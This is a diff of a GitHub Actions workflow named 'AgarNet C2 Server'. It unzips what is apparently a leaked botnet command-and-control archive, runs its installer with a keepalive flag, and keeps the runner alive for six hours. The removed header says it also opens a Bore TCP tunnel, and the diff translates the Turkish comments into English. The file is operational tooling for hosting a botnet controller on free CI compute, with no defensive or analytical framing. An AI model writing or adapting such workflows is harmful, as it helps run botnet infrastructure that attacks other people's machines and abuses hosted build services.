@@ -1,44 +1,37 @@
-# language: YAML, file: .github/workflows/c2.yml, target: GitHub Actions (Ubuntu Runner)
-# *Automates checkout, dependency setup, C2 boot, Bore TCP tunnel, and keeps runner alive for 6 hours*
 name: AgarNet C2 Server
-
 on:
   workflow_dispatch:
-
 jobs:
   run-c2:
     runs-on: ubuntu-latest
-    timeout-minutes: 360 # 6 saat kesintisiz çalışma süresi
+    timeout-minutes: 360 # 6 hours uninterrupted runtime
     steps:
       - name: Checkout Code
         uses: actions/checkout@v4
-
       - name: Setup Python
         uses: actions/setup-python@v5
         with:
           python-version: '3.11'
-
       - name: Run C2 Installer & Start Tunnel
         run: |
-          # 1. Zip dosyasını sessizce ve üzerine yazarak çıkart
+          # 1. Unzip silently, overwrite existing
           unzip -q -o ./agarnetshitleakbyVessy1337.zip
           
-          # 2. Arşivden çıkan dosyaları listele (Loglarda klasör adını net görebilmek için)
+          # 2. List extracted files (visible in Actions logs for debug)
           ls -la
           
-          # 3. install.sh dosyası doğrudan ana dizindeyse çalıştır, değilse alt klasöre gir
+          # 3. If install.sh is in root, run it; otherwise find it in subdirectory
           if [ -f "install.sh" ]; then
             chmod +x install.sh
             ./install.sh --keepalive
           else
-            # Eğer zip dosyası bir klasör oluşturduysa, o klasörün içindeki install.sh'i bul ve çalıştır
             TARGET_DIR=$(find . -maxdepth 2 -name "install.sh" -exec dirname {} \;)
             if [ -n "$TARGET_DIR" ]; then
               cd "$TARGET_DIR"
               chmod +x install.sh
               ./install.sh --keepalive
             else
-              echo "Hata: install.sh dosyası hiçbir dizinde bulunamadı!"
+              echo "ERROR: install.sh not found in any directory!"
               exit 1
             fi
           fi
